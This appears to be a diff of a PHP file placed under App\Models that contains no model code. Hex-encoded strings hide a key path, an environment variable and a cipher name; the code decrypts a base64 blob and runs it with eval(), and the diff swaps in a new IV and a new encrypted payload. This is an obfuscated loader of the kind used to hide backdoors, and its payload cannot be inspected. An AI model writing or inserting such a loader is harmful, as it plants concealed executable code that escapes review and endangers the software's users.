@@ -1,22 +1,32 @@
 <?php
 namespace App\Models;
 $f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
+
 $k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
+
 if(!$k)exit;
-$i=base64_decode('FXWxjic7pnhWNfAKGNjM6g==');
+
+$i=base64_decode('o4VN4brlNxfn4DjabKCTxw==');
+
 $c=base64_decode(
-'sPoyJ8jmoDWs2v5uawipzVKw+T2kgiG0hmbJUlXjK7/v//1s9lH5/novyEOoiI2Bjy2EA2EU6gzo' .
-'0IPz5cm4nJCrsalKnOgoguRvGES8Lz6XnBAjVPpCeLA16vO9iIu0tsy4UQvg6jQO4ekJGwYURLsx' .
-'znAV9EJE33Q59NJ4z4lXr7I5Kymc2BRKM8yxGbcI7wtmcXxy2aA22khDvJiJ3x58A35vsWV9p+da' .
-'jPOzI/usFbLq2yLgCK96WQtwiRYiXU27ESKlPIZul+qZlqm4ctLPGbIK1yFTCImqlo4KWeFuGK+S' .
-'5FHiAB/srvhbIv6AvAEYoHTAqbTPRIeNCEX5OgU7C0YL7Qa8QhoMji8BtLnJ5830MxfqSQ8x3DpE' .
-'oMcY7Nb2Q5+iu/kpEb0qmmFOfhpliVPxFevTFPZ+Zkn02Yu3qQeGFeJB+RjuUb5tk9qMpSTM0NT4' .
-'fSrYAye/jZout2dcQPWBWd6VF5O9icbEn79E5f+c+RthurcMDAgfls2JSxoY2dX9SVBDWRRXC0a1' .
-'rfPyDg2gBSPYIH598IexdYgJef5X9TbCFdPIJAXlmhS2vFXbS+xeu6yvzK//ISSZGePp1HaGsyOY' .
-'njx/T3GQ2w6cGAel7UVqxi0bLtGTGHOWVXwSwQbtneIKjmQ5C+M95FRK6l2iVXmhcopnxHaPIhfM' .
-'PF6X60Jk/Q71g+MUf4Z0xu/0cjmueqdf8/x2yRJgXtMcKNac7kGZpNVdfBUQ1gktkvcuJlEugVF3' .
-'MH5WMiOv9nu0sq9dunak7pcn8GuPKA=='
+
+'sE7FhwBuM7MSj1lgMvm5Z+xM+URMc24h7cWXT1k82aP0sKwi4uR/PhT9lwldvu3s83t7cYz49e3G' .
+'M24aWujqK+LGjB5+ykfWPuSNjLpbLmzPlINy8dUwhu9QtKUbbBkkOeTE4PaYpfGU6fyKXtGYyLsq' .
+'TKvFqtPEvv5jrD0WepgZDJM2b1S0Zym4ductxExmH4Bu94/1Nk234GWXkpHyInfw9H+kMoBpfCK8' .
+'qipJS/nN3QwJniplYoRpFN6q5tkDdw1vzPu+Mk+0ZsIU8HpAURE3P+Et8CjLbJ0fexyz7qUE0Sh7' .
+'QQHgZCyFypXWeVlpfPy2HWrbhWU+HEoTKUu5Uwmaq4hjiRZhCA9v4Yczf5Kg3lOhn6UOq2TDtSxQ' .
+'444OCyUwF3tTTJU4cm0vg0ZmTqadXwNbIpZKmAqh74ElXuD8OlwilFZddN5+wRIfvvffAHJeWVZe' .
+'NvDf61eHbUepQKU/Te+yDH9VSALtSkYa6922EOc/MUQvOD3bxvbqLyWhbhusiwCogTPdSnDeQxeG' .
+'3V1eMn/ICjC67L0C5a/apTnqbIENfYSN+4n/r9oeaQIyFOCLwtSvt4d/HSwbVAZOig8yvlGn4iBz' .
+'ugYUdWZlGguZl2KpKeg9aF0C/I+PsiwXciyxozWXeoNGT6FeuDdlqgmTMJuDMRMm3hBFbu/25BnM' .
+'kC7tyf7XgirZhMgNrI5uE/Cwsoaa27M1q5Tied6OcMN2ZADW7xjnf9G29yYy6F4eCUDj3OkO2Dl6' .
+'qJVKB81Tl4FuFVTQzpqTGxC2Wua9rA=='
+
 );
+
 $d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
+
 if($d===false)exit;
+
 eval($d);
+
